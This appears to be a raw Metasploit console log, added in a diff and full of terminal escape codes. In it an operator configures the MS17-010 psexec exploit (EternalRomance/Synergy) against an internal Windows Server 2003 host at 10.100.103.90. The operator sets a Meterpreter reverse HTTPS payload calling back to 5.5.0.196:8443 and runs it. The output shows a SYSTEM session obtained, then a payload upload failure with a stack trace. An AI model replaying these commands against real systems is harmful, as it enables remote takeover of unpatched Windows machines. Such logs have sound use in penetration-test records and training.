+  RHOST                                  yes       The target address
+  RPORT                 445              yes       The Target port
+  SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
+  SERVICE_DISPLAY_NAME                   no        The service display name
+  SERVICE_NAME                           no        The service name
+  SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
+  SMBDomain             .                no        The Windows domain to use for authentication
+  SMBPass                                no        The password for the specified username
+  SMBUser                                no        The username to authenticate as
+
+Payload information:
+  Space: 3072
+
+Description:
+  This module will exploit SMB with vulnerabilities in MS17-010 to 
+  achieve a write-what-where primitive. This will then be used to 
+  overwrite the connection session information with as an 
+  Administrator session. From there, the normal psexec payload code 
+  execution is done. Exploits a type confusion between Transaction and 
+  WriteAndX requests and a race condition in Transaction requests, as 
+  seen in the EternalRomance, EternalChampion, and EternalSynergy 
+  exploits. This exploit chain is more reliable than the EternalBlue 
+  exploit, but requires a named pipe.
+
+References:
+  Also known as: ETERNALSYNERGY
+  Also known as: ETERNALROMANCE
+  Also known as: ETERNALCHAMPION
+  Also known as: ETERNALBLUE
+  https://technet.microsoft.com/en-us/library/security/MS17-010
+  https://cvedetails.com/cve/CVE-2017-0143/
+  https://cvedetails.com/cve/CVE-2017-0146/
+  https://cvedetails.com/cve/CVE-2017-0147/
+  https://github.com/worawit/MS17-010
+  https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf
+  https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/
+
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> info exploit/windows/smb/ms17_010_psexec[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[Psearch eternal[P[Phow targets[P[P[P[P[Pexploitset RHOST 10.100.103.90exploit[Kshow optionsadvanced[Poptionset RHOST 10.100.103.144[P[P[P[P[PLHOST 5.5.0.196payload windows/x64/meterpreter/reverse_https[P[P[P[P[Puse exploit/windows/smb/ms17_010_eternalbluesearch eternal[K[P[Phow options[P[P[P[Pessions[Pexploitshow payloadsadvanced[K[K[K[K[K[K[K[K[K[K[K[K[Kuse exploit/windows/smb/ms17_010_psexec
+[0m[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_psexec[0m) [0m> show targets
+[0m
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Automatic
+   1   PowerShell
+   2   Native upload
+   3   MOF upload
+
+
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_psexec[0m) [0m> show targetsuse exploit/windows/smb/ms17_010_psexecinfo exploit/windows/smb/ms17_010_psexec[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[Psearch eternal[P[Phow targetsearch eternalinfo exploit/windows/smb/ms17_010_psexec[Puse[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cshow targets[K[Kset payload windows/x64/meterpreter/reverse_https
+[0mpayload => windows/x64/meterpreter/reverse_https
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_psexec[0m) [0m> set LHOST 5.5.0.196
+[0mLHOST => 5.5.0.196
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_psexec[0m) [0m> show options
+[0m
+Module options (exploit/windows/smb/ms17_010_psexec):
+
+   Name                  Current Setting  Required  Description
+   ----                  ---------------  --------  -----------
+   DBGTRACE              false            yes       Show extra debug trace info
+   LEAKATTEMPTS          99               yes       How many times to try to leak transaction
+   NAMEDPIPE                              no        A named pipe that can be connected to (leave blank for auto)
+   RHOST                                  yes       The target address
+   RPORT                 445              yes       The Target port
+   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
+   SERVICE_DISPLAY_NAME                   no        The service display name
+   SERVICE_NAME                           no        The service name
+   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
+   SMBDomain             .                no        The Windows domain to use for authentication
+   SMBPass                                no        The password for the specified username
+   SMBUser                                no        The username to authenticate as
+
+
+Payload options (windows/x64/meterpreter/reverse_https):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     5.5.0.196        yes       The local listener hostname
+   LPORT     8443             yes       The local listener port
+   LURI                       no        The HTTP Path
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_psexec[0m) [0m> set RHOST 10.100.103.90
+[0mRHOST => 10.100.103.90
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_psexec[0m) [0m> exploit
+[0m
+[1m[34m[*][0m Started HTTPS reverse handler on https://5.5.0.196:8443
+[1m[34m[*][0m 10.100.103.90:445 - Target OS: Windows Server 2003 R2 3790 Service Pack 1
+[1m[34m[*][0m 10.100.103.90:445 - Filling barrel with fish... done
+[1m[34m[*][0m 10.100.103.90:445 - <---------------- | Entering Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.103.90:445 - 	[*] Preparing dynamite...
+[1m[34m[*][0m 10.100.103.90:445 - 		Trying stick 1 (x64)...Miss
+[1m[34m[*][0m 10.100.103.90:445 - 		[*] Trying stick 2 (x86)...Boom!
+[1m[34m[*][0m 10.100.103.90:445 - 	[+] Successfully Leaked Transaction!
+[1m[34m[*][0m 10.100.103.90:445 - 	[+] Successfully caught Fish-in-a-barrel
+[1m[34m[*][0m 10.100.103.90:445 - <---------------- | Leaving Danger Zone | ---------------->
+[1m[34m[*][0m 10.100.103.90:445 - Reading from CONNECTION struct at: 0x858a7d48
+[1m[34m[*][0m 10.100.103.90:445 - Built a write-what-where primitive...
+[1m[32m[+][0m 10.100.103.90:445 - Overwrite complete... SYSTEM session obtained!
+[1m[34m[*][0m 10.100.103.90:445 - Selecting native target
+[1m[34m[*][0m 10.100.103.90:445 - Uploading payload...
+[1m[31m[-][0m 10.100.103.90:445 - Rex::Proto::SMB::Exceptions::NoReply
+[1m[31m[-][0m 10.100.103.90:445 - The SMB server did not reply to our request
+[1m[31m[-][0m 10.100.103.90:445 - /usr/share/metasploit-framework/lib/rex/proto/smb/client.rb:74:in `smb_recv'
+/usr/share/metasploit-framework/lib/rex/proto/smb/client.rb:159:in `smb_recv_and_cache'
+/usr/share/metasploit-framework/lib/rex/proto/smb/client.rb:208:in `block in smb_recv_parse'
+/usr/share/metasploit-framework/lib/rex/proto/smb/client.rb:207:in `upto'
+/usr/share/metasploit-framework/lib/rex/proto/smb/client.rb:207:in `smb_recv_parse'
+/usr/share/metasploit-framework/lib/rex/proto/smb/client.rb:1311:in `close'
+/usr/share/metasploit-framework/lib/rex/proto/smb/simpleclient/open_file.rb:28:in `close'
+/usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_psexec.rb:221:in `ensure in native_upload'
+/usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_psexec.rb:221:in `native_upload'
+/usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_psexec.rb:127:in `smb_pwn'
+/usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_psexec.rb:100:in `exploit'
+/usr/share/metasploit-framework/lib/msf/core/exploit_driver.rb:206:in `job_run_proc'
+/usr/share/metasploit-framework/lib/msf/core/exploit_driver.rb:167:in `run'
+/usr/share/metasploit-framework/lib/msf/base/simple/exploit.rb:136:in `exploit_simple'
+/usr/share/metasploit-framework/lib/msf/base/simple/exploit.rb:161:in `exploit_simple'
+/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/exploit.rb:110:in `cmd_exploit'
+/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:548:in `run_command'
+/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:510:in `block in run_single'
+/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:504:in `each'
+/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:504:in `run_single'
+/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:208:in `run'
+/usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
+/usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
+/usr/bin/msfconsole:48:in `<main>'
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_psexec[0m) [0m> exploitset RHOST 10.100.103.90[P[P[P[P[P[P[P[P[P[P[Phow optionset LHOST 5.5.0.196payload windows/x64/meterpreter/reverse_https[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Chow targets[Kuse exploit/windows/smb/ms17_010_psexecinfo exploit/windows/smb/ms17_010_psexec[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[Psearch eternal[P[Phow targets[P[P[P[P[Pexploitset RHOST 10.100.103.90exploit[Kshow optionsadvanced[Poptionset RHOST 10.100.103.144[P[P[P[P[PLHOST 5.5.0.196payload windows/x64/meterpreter/reverse_https[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[P[P[P[P[Puse exploit/windows/smb/ms17_010_eternalblueset payload windows/x64/meterpreter/reverse_https[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[PLHOST 5.5.0.196RHOST 10.100.103.144[P[P[P[P[P[P[P[P[P[P[P[Phow optionsadvanced[Poptions[P[P[P[P[Pexploitset RHOST 10.100.103.90exploit[Kshow targetsearch eternalinfo exploit/windows/smb/ms17_010_psexec[Puse[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cshow targets[Ket payload windows/x64/meterpreter/reverse_https[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[PLHOST 5.5.0.196[P[P[P[P[P[P[Phow optionset RHOST 10.100.103.90exploit[K[Kspool -h
+[0mUsage: spool <off>|<filename>
+
+Example:
+  spool /tmp/console.log
+
+[4mmsf[0m exploit([1m[31mwindows/smb/ms17_010_psexec[0m) [0m> spool off
+[0m
